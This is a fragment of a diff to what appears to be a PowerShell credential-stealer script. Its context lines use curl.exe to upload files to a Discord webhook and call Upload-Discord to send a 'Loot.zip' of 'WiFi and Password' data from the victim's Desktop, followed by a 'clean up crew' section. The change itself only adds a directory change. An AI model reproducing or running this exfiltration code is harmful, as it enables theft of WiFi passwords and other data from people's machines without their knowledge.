@@ -45,7 +45,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 ##### Upload .zip file to Discord #####
 
 Upload-Discord -text "WiFi and Password" -file "$env:USERPROFILE\Desktop\Loot.zip"
-
+cd $env:USERPROFILE
 
 ##### clean up crew #####
 
